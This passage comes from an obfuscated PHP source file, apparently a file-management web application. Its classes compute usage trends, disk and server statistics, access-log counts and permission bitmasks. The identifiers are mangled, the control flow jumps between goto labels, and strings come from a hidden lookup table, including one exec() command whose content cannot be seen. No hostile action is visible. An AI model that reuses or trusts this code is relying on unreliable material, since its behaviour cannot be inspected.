$Eå«×£ÚÅÏ[689]; while (strlen($cäÕĞå‰) < $Eå«×£ÚÅÏ[554]) { if (!$cäÕĞå‰) { break; } $cäÕĞå‰++; } } public function hcnk6005926f($Bå†‚ƒÒ„, $c‡±›ÎŒ”) { $B†®œéŸó¹ =& $_SERVER[ÀÌîòš£]; return $B†®œéŸó¹[13](array($B†®œéŸó¹[361], $B†®œéŸó¹[363]), $Bå†‚ƒÒ„, $c‡±›ÎŒ”); } } goto c¬¡³ò½„Š; DŞœ–Üµã: class AnalysisModel extends ModelBaseLight { public function init($cÕ°ƒó”ï) { $dİ½Ğöóæ¨ =& $_SERVER[Å¸ş]; $eÖŞ›Ü·Û = array($dİ½Ğöóæ¨[537] => array($dİ½Ğöóæ¨[29] => $dİ½Ğöóæ¨[2033], $dİ½Ğöóæ¨[261] => array($dİ½Ğöóæ¨[210], $dİ½Ğöóæ¨[703], $dİ½Ğöóæ¨[2034], $dİ½Ğöóæ¨[2035])), $dİ½Ğöóæ¨[2036] => array($dİ½Ğöóæ¨[29] => $dİ½Ğöóæ¨[2037], $dİ½Ğöóæ¨[261] => array($dİ½Ğöóæ¨[210], $dİ½Ğöóæ¨[701], $dİ½Ğöóæ¨[2038], $dİ½Ğöóæ¨[2039], $dİ½Ğöóæ¨[2040]))); if (!isset($eÖŞ›Ü·Û[$cÕ°ƒó”ï])) { return !1; } $this->optionType = $eÖŞ›Ü·Û[$cÕ°ƒó”ï][$dİ½Ğöóæ¨[29]]; $this->field = $eÖŞ›Ü·Û[$cÕ°ƒó”ï][$dİ½Ğöóæ¨[261]]; return !0; } public function listData($A—‚ö ¥¥ = false, $EÈğê¤Í»í = "\155\157\144\x69\146\171\x54\151\x6d\x65", $F÷÷‡ ¨† = false) { return parent::listData($A—‚ö ¥¥, $EÈğê¤Í»í, $F÷÷‡ ¨†); } public function trendList($eÜ¨—µÕˆğ) { goto AåÑöÇï”õ; AåÑöÇï”õ: $føç‡«Ó =& $_SERVER[Å¸ş]; $BŒğ¶´¨Õƒ = $this->listData(); if ($BŒğ¶´¨Õƒ) { $ağÒ²»İ¾İ = end($BŒğ¶´¨Õƒ); $FèÜ •¶ë = date($føç‡«Ó[2041], strtotime($føç‡«Ó[2042])); if ($ağÒ²»İ¾İ[$føç‡«Ó[210]] == $FèÜ •¶ë) { return $BŒğ¶´¨Õƒ; } $bĞ©ÚÜ–šº = strtotime($ağÒ²»İ¾İ[$føç‡«Ó[210]]); } goto BÑ¾´ñ‚º; BÑ¾´ñ‚º: if (!isset($bĞ©ÚÜ–šº)) { $d‘ƒëéÂÌá = $eÜ¨—µÕˆğ == $føç‡«Ó[537] ? $føç‡«Ó[479] : $føç‡«Ó[755]; $bĞ©ÚÜ–šº = Model($d‘ƒëéÂÌá)->min($føç‡«Ó[187]); } $dŞ¨…ÖÓœĞ = $føç‡«Ó[2043] . ucfirst($eÜ¨—µÕˆğ); $D¾Û—İ³¦× = $this->dateList($bĞ©ÚÜ–šº); goto c„Ù ‘’­; c„Ù ‘’­: foreach ($D¾Û—İ³¦× as $FèÜ •¶ë) { $this->{$dŞ¨…ÖÓœĞ}($FèÜ •¶ë); } return $this->listData(); goto DĞÉØ„È¿Î; DĞÉØ„È¿Î: } private function dateList($eÙ°¸µİº) { $dæğ©ÏÆ• =& $_SERVER[Å¸ş]; $fÊ¥Š‡ª’¾ = $eÙ°¸µİº; $béØ–««Ú = strtotime($dæğ©ÏÆ•[2042]); $D¤ğ†äœ = array(); while ($fÊ¥Š‡ª’¾ <= $béØ–««Ú) { $D¤ğ†äœ[] = date($dæğ©ÏÆ•[2041], $fÊ¥Š‡ª’¾); $fÊ¥Š‡ª’¾ = strtotime($dæğ©ÏÆ•[2044], $fÊ¥Š‡ª’¾); } return $D¤ğ†äœ; } public function _recordUser($E“Â ±¯³’ = '') { goto F…¹ğÃÓÚ; F…¹ğÃÓÚ: $e‚Ô¾ê‹Ü• =& $_SERVER[Å¸ş]; $DÓÊàÔ¹¾ = strtotime(date($e‚Ô¾ê‹Ü•[2045], strtotime($E“Â ±¯³’))); $Bïõ‚Í˜ëÉ = strtotime(date($e‚Ô¾ê‹Ü•[2046], strtotime($E“Â ±¯³’))); goto BŞäƒÚ‹Ùœ; cÏØ‰˜«äÚ: $E¯ÜÛå”µ¹ = array($e‚Ô¾ê‹Ü•[210] => $E“Â ±¯³’, $e‚Ô¾ê‹Ü•[703] => (int) $eÈµÕ•Çò, $e‚Ô¾ê‹Ü•[2034] => (int) $Cæí÷£ÒÙó, $e‚Ô¾ê‹Ü•[2035] => (int) $a¥ÏŸ˜†£); return $this->insert($E¯ÜÛå”µ¹); goto cÒÆ„±ßÅ; BŞäƒÚ‹Ùœ: $BŠÌ´‰‚… = array($e‚Ô¾ê‹Ü•[187] => array($e‚Ô¾ê‹Ü•[924], $Bïõ‚Í˜ëÉ)); $eÈµÕ•Çò = Model($e‚Ô¾ê‹Ü•[479])->where($BŠÌ´‰‚…)->count($e‚Ô¾ê‹Ü•[1436]); $BŠÌ´‰‚…[$e‚Ô¾ê‹Ü•[187]] = array($e‚Ô¾ê‹Ü•[321], array($DÓÊàÔ¹¾, $Bïõ‚Í˜ëÉ)); goto E¡Â¯ÌœƒÊ; E¡Â¯ÌœƒÊ: $Cæí÷£ÒÙó = Model($e‚Ô¾ê‹Ü•[479])->where($BŠÌ´‰‚…)->count($e‚Ô¾ê‹Ü•[1436]); $BŠÌ´‰‚…[$e‚Ô¾ê‹Ü•[29]] = $e‚Ô¾ê‹Ü•[2047]; $a¥ÏŸ˜†£ = Model($e‚Ô¾ê‹Ü•[2048])->where($BŠÌ´‰‚…)->count($e‚Ô¾ê‹Ü•[2049]); goto cÏØ‰˜«äÚ; cÒÆ„±ßÅ: } public function _recordStore($F°íÖ”‘Í³ = '') { goto d——íĞ›öÃ; a‡‘Ò×„‰: $DõóÛ¤èéÊ[$A°Ìã¨åâ[371]] = 1; $FáÂ„ºíŸÎ = Model($A°Ìã¨åâ[755])->where($DõóÛ¤èéÊ)->sum($A°Ìã¨åâ[77]); $DõóÛ¤èéÊ[$A°Ìã¨åâ[371]] = 2; goto f¥ä°­‡ëÚ; f×Ä¾Ä˜À‚: $d”Æ‹ò‡« = Model($A°Ìã¨åâ[422])->where($DõóÛ¤èéÊ)->sum($A°Ìã¨åâ[77]); $DõóÛ¤èéÊ[$A°Ìã¨åâ[370]] = 0; $dóÉê²°ŒÕ = Model($A°Ìã¨åâ[755])->where($DõóÛ¤èéÊ)->sum($A°Ìã¨åâ[77]); goto a‡‘Ò×„‰; f¥ä°­‡ëÚ: $e’”·ÃëÍÑ = Model($A°Ìã¨åâ[755])->where($DõóÛ¤èéÊ)->sum($A°Ìã¨åâ[77]); $FÇ·ìº²ªÌ = array($A°Ìã¨åâ[210] => $F°íÖ”‘Í³, $A°Ìã¨åâ[701] => (int) $dóÉê²°ŒÕ, $A°Ìã¨åâ[2038] => (int) $d”Æ‹ò‡«, $A°Ìã¨åâ[2039] => (int) $FáÂ„ºíŸÎ, $A°Ìã¨åâ[2040] => (int) $e’”·ÃëÍÑ); return $this->insert($FÇ·ìº²ªÌ); goto fÆÂ¨º£Œ; d——íĞ›öÃ: $A°Ìã¨åâ =& $_SERVER[Å¸ş]; $DíÏÃÖÃËÅ = strtotime(date($A°Ìã¨åâ[2046], strtotime($F°íÖ”‘Í³))); $DõóÛ¤èéÊ = array($A°Ìã¨åâ[187] => array($A°Ìã¨åâ[924], $DíÏÃÖÃËÅ)); goto f×Ä¾Ä˜À‚; fÆÂ¨º£Œ: } public function trend($fôêï£‹ƒª, $eÅéœÑÀç) { goto eÍŠ«½˜Å§; cÅÛ×…Ş‘: return $D ñ©ğÙÌÊ; goto c¼“ù—Ö ©; b­ƒ²áø·â: if ($B‰æĞ—å¾Í && $eÅéœÑÀç != $CˆòÇÇ±™ä[1411]) { $d¨¦öµ©´“ = $B‰æĞ—å¾Í[0][$CˆòÇÇ±™ä[210]]; $f¢›ß‰Õö¼ = $this->validDate($eÅéœÑÀç, $d¨¦öµ©´“); $aœåØ›êñ = array(); $CÄ¥¤«³‘ = array_to_keyvalue($B‰æĞ—å¾Í, $CˆòÇÇ±™ä[210]); foreach ($f¢›ß‰Õö¼ as $Dç‘·ƒõ²—) { if (isset($CÄ¥¤«³‘[$Dç‘·ƒõ²—])) { $EœèóÓÎŒá = $CÄ¥¤«³‘[$Dç‘·ƒõ²—]; } else { $EœèóÓÎŒá = end($B‰æĞ—å¾Í); $EœèóÓÎŒá[$CˆòÇÇ±™ä[210]] = $Dç‘·ƒõ²—; if ($fôêï£‹ƒª == $CˆòÇÇ±™ä[537]) { $EœèóÓÎŒá[$CˆòÇÇ±™ä[2034]] = $EœèóÓÎŒá[$CˆòÇÇ±™ä[2035]] = 0; } } $aœåØ›êñ[] = $EœèóÓÎŒá; } $B‰æĞ—å¾Í = $aœåØ›êñ; } $dô‹…˜Ñ¹„ = array($CˆòÇÇ±™ä[537] => array($CˆòÇÇ±™ä[703] => LNG($CˆòÇÇ±™ä[2050]), $CˆòÇÇ±™ä[2034] => LNG($CˆòÇÇ±™ä[2051]), $CˆòÇÇ±™ä[2035] => LNG($CˆòÇÇ±™ä[2052])), $CˆòÇÇ±™ä[2036] => array($CˆòÇÇ±™ä[701] => LNG($CˆòÇÇ±™ä[2053]), $CˆòÇÇ±™ä[2038] => LNG($CˆòÇÇ±™ä[2054]), $CˆòÇÇ±™ä[2039] => LNG($CˆòÇÇ±™ä[2055]), $CˆòÇÇ±™ä[2040] => LNG($CˆòÇÇ±™ä[2056]))); $Aù‹ñ±ß§Ù = array($CˆòÇÇ±™ä[537] => $CˆòÇÇ±™ä[2057], $CˆòÇÇ±™ä[2036] => $CˆòÇÇ±™ä[77]); goto câİ¦Š âÊ; eÍŠ«½˜Å§: $CˆòÇÇ±™ä =& $_SERVER[Å¸ş]; if (!$this->init($fôêï£‹ƒª)) { return !1; } $B‰æĞ—å¾Í = $this->trendList($fôêï£‹ƒª); goto b­ƒ²áø·â; câİ¦Š âÊ: if (empty($B‰æĞ—å¾Í)) { $Dç‘·ƒõ²— = date($CˆòÇÇ±™ä[2041], strtotime($CˆòÇÇ±™ä[2042])); $Bø¾ö«É…Ş = array($CˆòÇÇ±™ä[210] => $Dç‘·ƒõ²—); foreach ($dô‹…˜Ñ¹„[$fôêï£‹ƒª] as $cç©ƒ†ôê˜ => $dãÃ†¦°×Í) { $Bø¾ö«É…Ş[$cç©ƒ†ôê˜] = 0; } $B‰æĞ—å¾Í[] = $Bø¾ö«É…Ş; } $D ñ©ğÙÌÊ = array(); foreach ($B‰æĞ—å¾Í as $dãÃ†¦°×Í) { if ($fôêï£‹ƒª == $CˆòÇÇ±™ä[2036] && $dãÃ†¦°×Í[$CˆòÇÇ±™ä[2038]] > $dãÃ†¦°×Í[$CˆòÇÇ±™ä[701]]) { $dãÃ†¦°×Í[$CˆòÇÇ±™ä[2038]] = $dãÃ†¦°×Í[$CˆòÇÇ±™ä[701]]; } foreach ($dô‹…˜Ñ¹„[$fôêï£‹ƒª] as $cç©ƒ†ôê˜ => $F¯ç¦òñ‹) { $EœèóÓÎŒá = array($CˆòÇÇ±™ä[210] => $dãÃ†¦°×Í[$CˆòÇÇ±™ä[210]], $CˆòÇÇ±™ä[1340] => $F¯ç¦òñ‹); $EœèóÓÎŒá[$Aù‹ñ±ß§Ù[$fôêï£‹ƒª]] = isset($dãÃ†¦°×Í[$cç©ƒ†ôê˜]) ? $dãÃ†¦°×Í[$cç©ƒ†ôê˜] : 0; $D ñ©ğÙÌÊ[] = $EœèóÓÎŒá; } } goto cÅÛ×…Ş‘; c¼“ù—Ö ©: } public function validDate($c…ßÎ‰îÉ, $f„ˆÏ¦¯¢) { goto AÜÅğÛ¼‡; aòîÌà öå: switch ($c…ßÎ‰îÉ) { case $Dœó±Ö¹¦›[1418]: $CˆÄºÛÙ²“ = mktime(0, 0, 0, date($Dœó±Ö¹¦›[2058]), date($Dœó±Ö¹¦›[2059]) - date($Dœó±Ö¹¦›[1224]) + 7 - 7, date($Dœó±Ö¹¦›[2060])); $e¿†¹ÌŸÖù = 0; do { $D¹ÃïĞÂâí = date($Dœó±Ö¹¦›[2041], $CˆÄºÛÙ²“ - 3600 * 24 * 7 * $e¿†¹ÌŸÖù); $e©Ù¹ïÔ¤ï[] = $D¹ÃïĞÂâí; $e¿†¹ÌŸÖù++; } while ($f„ˆÏ¦¯¢ < $D¹ÃïĞÂâí); break; case $Dœó±Ö¹¦›[1416]: $e¿†¹ÌŸÖù = 1; do { $CøÑâ„ù×Ü = date($Dœó±Ö¹¦›[2061], strtotime("\55\40{$e¿†¹ÌŸÖù}\x20\x6d\x6f\156\x74\x68\x73")); $e©Ù¹ïÔ¤ï[] = $CøÑâ„ù×Ü; $e¿†¹ÌŸÖù++; } while ($f„ˆÏ¦¯¢ < $CøÑâ„ù×Ü); break; case $Dœó±Ö¹¦›[1725]: $cŒ¶ëÂ¶Ü¥ = (int) date($Dœó±Ö¹¦›[2060], strtotime($f„ˆÏ¦¯¢)); $FÂ©‡Œöà = (int) date($Dœó±Ö¹¦›[2060]); if ($cŒ¶ëÂ¶Ü¥ >= $FÂ©‡Œöà) { break; } for ($cŒ¶ëÂ¶Ü¥; $cŒ¶ëÂ¶Ü¥ < $FÂ©‡Œöà; $cŒ¶ëÂ¶Ü¥++) { $e©Ù¹ïÔ¤ï[] = $cŒ¶ëÂ¶Ü¥ . $Dœó±Ö¹¦›[2062]; } break; default: break; } if ($f„ˆÏ¦¯¢ > end($e©Ù¹ïÔ¤ï)) { array_pop($e©Ù¹ïÔ¤ï); } sort($e©Ù¹ïÔ¤ï); goto BèÈ˜á’•; AÜÅğÛ¼‡: $Dœó±Ö¹¦› =& $_SERVER[Å¸ş]; $D³˜ ŸâĞå = date($Dœó±Ö¹¦›[2041], strtotime($Dœó±Ö¹¦›[2042])); $e©Ù¹ïÔ¤ï = array($D³˜ ŸâĞå); goto aòîÌà öå; BèÈ˜á’•: return $e©Ù¹ïÔ¤ï; goto f‹³ª‘œé¹; f‹³ª‘œé¹: } public function listTable($c¨©¡¬Ä§¼) { $EÄ×Ÿ°œêÍ = ucfirst($c¨©¡¬Ä§¼); return Model($EÄ×Ÿ°œêÍ)->listData(); } public function option($bŞèƒìŞ) { $BÍÕé³Ê©… = $_SERVER[Å¸ş][2063] . ucfirst($bŞèƒìŞ); return $this->{$BÍÕé³Ê©…}(); } private function optionUser() { goto dòŠ‰¡; f§£ç…øä¨: $fÆöŞ¤·ö = strtotime($E¿Ù·°”…[2065]); $c´Óƒá²¼Ù = array($E¿Ù·°”…[2066] => array($E¿Ù·°”…[925], $fÆöŞ¤·ö)); $aøÏß´°Š¿ = (int) Model($E¿Ù·°”…[479])->where($c´Óƒá²¼Ù)->count($E¿Ù·°”…[1436]); goto e‚âë†‰Ó; e‚âë†‰Ó: if (!$aøÏß´°Š¿) { $aøÏß´°Š¿ = 1; } $fÆöŞ¤·ö = strtotime(date($E¿Ù·°”…[2045])); $c´Óƒá²¼Ù = array($E¿Ù·°”…[2066] => array($E¿Ù·°”…[925], $fÆöŞ¤·ö)); goto DÚ¡µ˜™Š; DÚ¡µ˜™Š: $c´½ºùÊÚÍ = Model($E¿Ù·°”…[479])->where($c´Óƒá²¼Ù)->count($E¿Ù·°”…[1436]); return array($E¿Ù·°”…[698] => (int) $f”¿›î¢¹ñ, $E¿Ù·°”…[2067] => (int) ($f”¿›î¢¹ñ - $F¨¶Æ¼Û‹), $E¿Ù·°”…[2068] => (int) $F¨¶Æ¼Û‹, $E¿Ù·°”…[2069] => (int) $c´½ºùÊÚÍ, $E¿Ù·°”…[2070] => $aøÏß´°Š¿); goto bÕ¡‰Î„­ˆ; dòŠ‰¡: $E¿Ù·°”… =& $_SERVER[Å¸ş]; $f”¿›î¢¹ñ = Model($E¿Ù·°”…[479])->count($E¿Ù·°”…[1436]); $F¨¶Æ¼Û‹ = Model($E¿Ù·°”…[479])->where($E¿Ù·°”…[2064])->count($E¿Ù·°”…[1436]); goto f§£ç…øä¨; bÕ¡‰Î„­ˆ: } private function optionFile() { goto dæ¬óÈ“‡; D®óÔâå: $fÖ½±Ÿéè = Model($Bœ±Ï·Ø«Æ[755])->where($aÚ¦³…ñ­Ì)->sum($Bœ±Ï·Ø«Æ[77]); $D¼¢õ÷‡î„ = Model($Bœ±Ï·Ø«Æ[755])->where($aÚ¦³…ñ­Ì)->count($Bœ±Ï·Ø«Æ[369]); return array($Bœ±Ï·Ø«Æ[701] => $e©ª‹‚ï‚ì, $Bœ±Ï·Ø«Æ[2038] => $fÏ¿ËÉ¬‚–, $Bœ±Ï·Ø«Æ[2071] => $e©ª‹‚ï‚ì - $fÏ¿ËÉ¬‚–, $Bœ±Ï·Ø«Æ[2072] => (int) $fÖ½±Ÿéè, $Bœ±Ï·Ø«Æ[703] => (int) $e…ÚÏŒ©ù, $Bœ±Ï·Ø«Æ[2073] => (int) $D¼¢õ÷‡î„); goto E”›²ã†œ; dæ¬óÈ“‡: $Bœ±Ï·Ø«Æ =& $_SERVER[Å¸ş]; $B›ƒÊÖÊË¶ = $this->sourceSize(); $e©ª‹‚ï‚ì = $B›ƒÊÖÊË¶[$Bœ±Ï·Ø«Æ[77]]; goto bˆµâ˜à; bˆµâ˜à: $fÏ¿ËÉ¬‚– = $B›ƒÊÖÊË¶[$Bœ±Ï·Ø«Æ[2038]]; $e…ÚÏŒ©ù = Model($Bœ±Ï·Ø«Æ[755])->where(array($Bœ±Ï·Ø«Æ[370] => 0))->count($Bœ±Ï·Ø«Æ[369]); $aÚ¦³…ñ­Ì = array($Bœ±Ï·Ø«Æ[370] => 0, $Bœ±Ï·Ø«Æ[187] => array($Bœ±Ï·Ø«Æ[925], strtotime(date($Bœ±Ï·Ø«Æ[2045])))); goto D®óÔâå; E”›²ã†œ: } private function optionAccess() { $eª†ÄŠ²¥Ö =& $_SERVER[Å¸ş]; return array($eª†ÄŠ²¥Ö[698] => $this->typeLogCnt(), $eª†ÄŠ²¥Ö[103] => $this->typeLogCnt($eª†ÄŠ²¥Ö[103]), $eª†ÄŠ²¥Ö[404] => $this->typeLogCnt($eª†ÄŠ²¥Ö[404]), $eª†ÄŠ²¥Ö[2074] => $this->typeLogCnt($eª†ÄŠ²¥Ö[2074]), $eª†ÄŠ²¥Ö[2075] => $this->typeLogCnt($eª†ÄŠ²¥Ö[2075]), $eª†ÄŠ²¥Ö[537] => $this->typeLogCnt($eª†ÄŠ²¥Ö[33], $eª†ÄŠ²¥Ö[2049])); } private function typeLogCnt($cƒ³¼¤¶¸ = '', $EŞ£­ª°¶„ = "\x69\144") { goto Dª±‰·­Ù; eÒº‚­íº¬: $f£ÜíæÏ¯ì = array($Dè°Œè‰Şƒ[187] => array($Dè°Œè‰Şƒ[925], $aŠ™ğµìÆï)); if ($cƒ³¼¤¶¸) { $f£ÜíæÏ¯ì[$Dè°Œè‰Şƒ[29]] = array($Dè°Œè‰Şƒ[7], $CÄË–ç„À[$cƒ³¼¤¶¸]); } $e¶Ï¿¯„Œ¤ = Model($Dè°Œè‰Şƒ[2048])->where($f£ÜíæÏ¯ì)->count($EŞ£­ª°¶„); goto eç­‡“Şœ; Dª±‰·­Ù: $Dè°Œè‰Şƒ =& $_SERVER[Å¸ş]; $CÄË–ç„À = array($Dè°Œè‰Şƒ[103] => array($Dè°Œè‰Şƒ[2076], $Dè°Œè‰Şƒ[2077]), $Dè°Œè‰Şƒ[404] => array($Dè°Œè‰Şƒ[2078], $Dè°Œè‰Şƒ[2079]), $Dè°Œè‰Şƒ[2074] => array($Dè°Œè‰Şƒ[2080], $Dè°Œè‰Şƒ[2081], $Dè°Œè‰Şƒ[2082]), $Dè°Œè‰Şƒ[2075] => array($Dè°Œè‰Şƒ[2083], $Dè°Œè‰Şƒ[2084]), $Dè°Œè‰Şƒ[2085] => array($Dè°Œè‰Şƒ[2086], $Dè°Œè‰Şƒ[2087], $Dè°Œè‰Şƒ[2088])); $aŠ™ğµìÆï = strtotime(date($Dè°Œè‰Şƒ[2045])); goto eÒº‚­íº¬; eç­‡“Şœ: return (int) $e¶Ï¿¯„Œ¤; goto AšåÜ¶ô¨„; AšåÜ¶ô¨„: } private function optionServer() { goto cí©µ«§ã; cí©µ«§ã: $F°¡Â‘ÒîÊ =& $_SERVER[Å¸ş]; $f¯÷íÂã¾Ù = $this->diskDriver(); $cŒ‰Œ„ÙŠ = KodIO::defaultDriver(); goto B£¿ÂÏ¬Ç; fîê¸­àè: $få°öÆ²åù = $D™¯±Çò­Ğ[0]; $e Š”§ÉÓ = $GLOBALS[$F°¡Â‘ÒîÊ[6]][$F°¡Â‘ÒîÊ[17]]; $e°¾Ÿä£ = $e Š”§ÉÓ[$F°¡Â‘ÒîÊ[885]]; goto b„×¿éì¸; dÌ”¥Š½öˆ: return array($F°¡Â‘ÒîÊ[2091] => $f¯÷íÂã¾Ù ? $f¯÷íÂã¾Ù[$F°¡Â‘ÒîÊ[2092]] : 0, $F°¡Â‘ÒîÊ[2093] => $f¯÷íÂã¾Ù ? $f¯÷íÂã¾Ù[$F°¡Â‘ÒîÊ[2094]] : 0, $F°¡Â‘ÒîÊ[2095] => (int) $cŒ‰Œ„ÙŠ[$F°¡Â‘ÒîÊ[2092]] * 1024 * 1024 * 1024, $F°¡Â‘ÒîÊ[2096] => (int) $aøœˆÂİ, $F°¡Â‘ÒîÊ[2097] => ucfirst($få°öÆ²åù), $F°¡Â‘ÒîÊ[2098] => $F°¡Â‘ÒîÊ[2099] . PHP_VERSION, $F°¡Â‘ÒîÊ[2100] => phpBuild64() ? 64 : 32, $F°¡Â‘ÒîÊ[697] => str_replace($F°¡Â‘ÒîÊ[2101], $F°¡Â‘ÒîÊ[901], $e°¾Ÿä£), $F°¡Â‘ÒîÊ[337] => ucfirst($EİÚ‰¾ó), $F°¡Â‘ÒîÊ[28] => $_SERVER[$F°¡Â‘ÒîÊ[2102]]); goto fÚØ½Ò‡×†; B£¿ÂÏ¬Ç: $Bšºµ÷œ´¯ = array($F°¡Â‘ÒîÊ[746] => $cŒ‰Œ„ÙŠ[$F°¡Â‘ÒîÊ[367]]); $aøœˆÂİ = Model($F°¡Â‘ÒîÊ[422])->where($Bšºµ÷œ´¯)->sum($F°¡Â‘ÒîÊ[77]); $D™¯±Çò­Ğ = explode($F°¡Â‘ÒîÊ[50], $_SERVER[$F°¡Â‘ÒîÊ[139]]); goto fîê¸­àè; b„×¿éì¸: if ($e°¾Ÿä£ == $F°¡Â‘ÒîÊ[726]) { $CĞ„‰²Á•÷ = explode($F°¡Â‘ÒîÊ[1074], $e Š”§ÉÓ[$F°¡Â‘ÒîÊ[884]]); $e°¾Ÿä£ = $CĞ„‰²Á•÷[0]; } if ($e°¾Ÿä£ == $F°¡Â‘ÒîÊ[729] || $e°¾Ÿä£ == $F°¡Â‘ÒîÊ[730]) { $e²›¥©ƒ = Model()->db()->query($F°¡Â‘ÒîÊ[2089]); $A’™ë½ö¿ = $e²›¥©ƒ[0] && isset($e²›¥©ƒ[0][$F°¡Â‘ÒîÊ[1339]]) ? $e²›¥©ƒ[0][$F°¡Â‘ÒîÊ[1339]] : 0; $e°¾Ÿä£ = $F°¡Â‘ÒîÊ[2090] . ($A’™ë½ö¿ ? $F°¡Â‘ÒîÊ[8] . $A’™ë½ö¿ : $F°¡Â‘ÒîÊ[33]); } $EİÚ‰¾ó = $GLOBALS[$F°¡Â‘ÒîÊ[6]][$F°¡Â‘ÒîÊ[337]][$F°¡Â‘ÒîÊ[757]]; goto dÌ”¥Š½öˆ; fÚØ½Ò‡×†: } private function diskDriver() { goto e“¶Øîç³®; e“¶Øîç³®: $A”Îò‹ô =& $_SERVER[Å¸ş]; $fÙ‹Â¶ÀÈİ = $A”Îò‹ô[8]; $AÜ¥· É ‚ = $GLOBALS[$A”Îò‹ô[6]][$A”Îò‹ô[2103]] == $A”Îò‹ô[2104]; goto aáÅ¿ÕŞÂ; eÒ‘òêÊ: $a˜ÄÀ¡†¸ = $e›ˆ—Œ¢·º - @disk_free_space($fÙ‹Â¶ÀÈİ); return array($A”Îò‹ô[2092] => $e›ˆ—Œ¢·º, $A”Îò‹ô[2094] => $a˜ÄÀ¡†¸); goto eäá¨äÛ…‚; aáÅ¿ÕŞÂ: if ($AÜ¥· É ‚) { $fÙ‹Â¶ÀÈİ = $A”Îò‹ô[2105]; if (function_exists($A”Îò‹ô[2106])) { exec($A”Îò‹ô[2107], $DæÁ¤ì¶Îø); $fÙ‹Â¶ÀÈİ = $DæÁ¤ì¶Îø[1] . $A”Îò‹ô[8]; } } if (!file_exists($fÙ‹Â¶ÀÈİ)) { return; } $e›ˆ—Œ¢·º = @disk_total_space($fÙ‹Â¶ÀÈİ); goto eÒ‘òêÊ; eäá¨äÛ…‚: } public function fileChart($f¨“†™Œœç) { goto E‚‰ĞÀİçï; AÂíù³«â¬: $c°±á¡÷¾ê[$f‹Ø·ÙÔİ£[371]] = 2; $C«ÇØ¶³ÔÎ = Model($f‹Ø·ÙÔİ£[755])->where($c°±á¡÷¾ê)->sum($f‹Ø·ÙÔİ£[77]); return array($f‹Ø·ÙÔİ£[701] => $dµô‹ÖØ[$f‹Ø·ÙÔİ£[77]], $f‹Ø·ÙÔİ£[2038] => $dµô‹ÖØ[$f‹Ø·ÙÔİ£[2038]], $f‹Ø·ÙÔİ£[2039] => (int) $D×¼–İàŠó, $f‹Ø·ÙÔİ£[2040] => (int) $C«ÇØ¶³ÔÎ); goto a•øùö‡°; BÖ¬ŞàŒÉĞ: $dµô‹ÖØ = $this->sourceSize(); $c°±á¡÷¾ê = array($f‹Ø·ÙÔİ£[463] => 0, $f‹Ø·ÙÔİ£[371] => 1); $D×¼–İàŠó = Model($f‹Ø·ÙÔİ£[755])->where($c°±á¡÷¾ê)->sum($f‹Ø·ÙÔİ£[77]); goto AÂíù³«â¬; E‚‰ĞÀİçï: $f‹Ø·ÙÔİ£ =& $_SERVER[Å¸ş]; if (isset($f¨“†™Œœç[$f‹Ø·ÙÔİ£[1436]])) { return Model($f‹Ø·ÙÔİ£[755])->userFileTypeProfile($f¨“†™Œœç[$f‹Ø·ÙÔİ£[1436]]); } if (isset($f¨“†™Œœç[$f‹Ø·ÙÔİ£[2108]])) { return Model($f‹Ø·ÙÔİ£[755])->groupFileTypeProfile($f¨“†™Œœç[$f‹Ø·ÙÔİ£[2108]]); } goto BÖ¬ŞàŒÉĞ; a•øùö‡°: } private function sourceSize() { $aççÄœ• =& $_SERVER[Å¸ş]; $B¹Îİä·‹Ä = Model($aççÄœ•[755])->where(array($aççÄœ•[370] => 0))->sum($aççÄœ•[77]); $E‹ˆÁÙ‰ò = Model($aççÄœ•[422])->sum($aççÄœ•[77]); if ($E‹ˆÁÙ‰ò > $B¹Îİä·‹Ä) { $E‹ˆÁÙ‰ò = $B¹Îİä·‹Ä; } return array($aççÄœ•[77] => (int) $B¹Îİä·‹Ä, $aççÄœ•[2038] => (int) $E‹ˆÁÙ‰ò); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $bÕóÉêÈëŸ =& $_SERVER[Å¸ş]; $dñì¯Èš° = array(array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2109]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2111], $bÕóÉêÈëŸ[2112] => 6, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2115]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2116], $bÕóÉêÈëŸ[2112] => 1, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2117]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2118], $bÕóÉêÈëŸ[2112] => 2, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2119]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2118], $bÕóÉêÈëŸ[2112] => 3, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2120]), 